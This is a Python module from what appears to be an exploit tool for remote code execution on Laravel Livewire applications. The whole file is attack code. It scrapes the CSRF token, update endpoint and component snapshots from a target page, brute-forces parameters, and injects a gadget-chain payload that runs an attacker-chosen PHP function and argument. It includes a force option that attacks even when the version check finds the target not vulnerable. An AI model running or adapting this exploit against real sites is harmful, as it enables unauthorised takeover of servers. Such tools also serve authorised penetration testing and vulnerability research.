import re
import json
import html

from importlib.resources import files

from .exploit import Exploit

class ExploitWithoutAppKey(Exploit):
    def __init__(self, url, debug, function, param, headers, proxy_url, check, force=False):
        self.force = force
        super().__init__(url, debug, function, param, headers, proxy_url, check=check)
            
    def stage1(self, param_name, snapshot):
        payload = {
            "_token": self.token,
            "components": [
                {
                    "snapshot": snapshot,
                    "updates":{
                        param_name: []
                    },
                    "calls":[]
                }
            ]
        }
        url = f"{self.base_url}{self.update_uri}"
        if self.update_uri.startswith(("http://", "https://")):
            url = self.update_uri
        self.logger.debug(f"POST -> {self.url}")
        res = self.session.post(url, json=payload)
        return res.json()
        
    def stage2(self, snapshot, param):
        json_payload = json.loads((files("exploit") / "payload.json").read_text(encoding="utf-8"))
        json_payload["_token"] = self.token
        json_payload["components"][0]["snapshot"] = snapshot
        
        # To change the param name in the payload
        updated_payload = json_payload["components"][0]["updates"]
        updated_payload[param] = updated_payload.pop("TARGET")
        
        # To take into account the user payload
        user_payload = json_payload["components"][0]["updates"][param][1][0]["a"][0]["close"][0][0][0]["chained"][0].replace("[FUNCTION_LEN]", str(len(self.function)))
        user_payload = user_payload.replace("[FUNCTION]", self.function)
        user_payload = user_payload.replace("[PARAM_LEN]", str(len(self.param)))
        user_payload = user_payload.replace("[PARAM]", self.param)
        json_payload["components"][0]["updates"][param][1][0]["a"][0]["close"][0][0][0]["chained"][0] = user_payload
        
        self.logger.info(f"Sending payload {self.function}('{self.param}') to livewire.")
        url = f"{self.base_url}{self.update_uri}"
        if self.update_uri.startswith(("http://", "https://")):
            url = self.update_uri
        self.logger.debug(f"POST -> {self.url}")
        res = self.session.post(url, json=json_payload)
        if res.status_code != 200 or '"snapshot"' in res.text:
            self.logger.error(f"Server encounters an error or exploit failed.")
            return False
        else:
            self.logger.info(f"Payload works, output:\033[0m\n{res.text}")
            return True
        
    def exploit(self):
        self.logger.info("Running exploit without APP_KEY.")
        stop = False
        self.token = self.get_csrf_token(self.page_content.text)
        if self.token is None:
            self.logger.error("Impossible to locate CSRF token. Exiting.")
            return
        self.update_uri = self.get_update_uri(self.page_content.text)
        if self.update_uri is None:
            self.logger.error("Impossible to locate update URI. Exiting.")
            return
        all_snapshots = re.findall(r'wire:snapshot="([^"]*)"', self.page_content.text)
        self.logger.info(f"Found {len(all_snapshots)} snapshot(s) available.")
        for snapshot in all_snapshots:
            if stop:
                break
            snapshot_content = json.loads(html.unescape(snapshot))
            if len(snapshot_content['data']) == 0:
                self.logger.error(f"No param found. Exiting.")
                continue
            self.logger.info(f"Found {len(snapshot_content['data'].keys())} possible param(s).")
            self.logger.info("Checking for parameter(s) with object type to avoid bruteforce.")
            potential_rce_param = self.check_array_param(snapshot_content['data'])
            if potential_rce_param is not None:
                self.logger.info(f"{potential_rce_param} is typed as an object, triggering RCE.")
                if self.stage2(json.dumps(snapshot_content), potential_rce_param):
                    self.logger.debug(f"Exploit works with param {potential_rce_param}.")
                    break
                else:
                    self.logger.error(f"Exploit failed with param {potential_rce_param}.")
            else:
                self.logger.warning("No param with object type was found, attempting bruteforce.")
            for param in snapshot_content["data"].keys():
                self.logger.info(f"Trying to gain RCE with param {param}.")
                try:
                    new_snapshot = self.stage1(param, json.dumps(snapshot_content))["components"][0]["snapshot"]
                except:
                    self.logger.error(f"Casting as array failed.")
                    continue
                if self.stage2(new_snapshot, param):
                    self.logger.debug(f"Exploit works with param {param}.")
                    stop = True
                    break
        
    def run(self):
        try:
            self.logger.debug(f"GET -> {self.url}")
            self.page_content = self.session.get(self.url, timeout=5)
        except Exception as e:
            self.logger.debug(e)
            self.logger.error(f"Timeout GET -> {self.url}")
            return
        if not self.check_livewire():
            self.logger.error("Target does not seem to be running Livewire. Exiting.")
            return
        if not self.check_livewire_version():
            self.logger.debug("Target is not vulnerable. Exiting.")
            if not self.force:
                return
            else:
                self.logger.error("Running exploit even if target does not seem to be vulnerable.")
        if self.only_check:
            self.logger.debug("Check finished. Exiting.")
            return
        if not self.check_snapshot():
            self.logger.error("No snapshots found. Exiting.")
        else:
            self.logger.info("Found snapshot(s). Running exploit.")
        
        try:
            self.logger.debug(f"Running exploit.")
            self.exploit()
        except Exception as e:
            self.logger.error(f"Request failed: {e}")
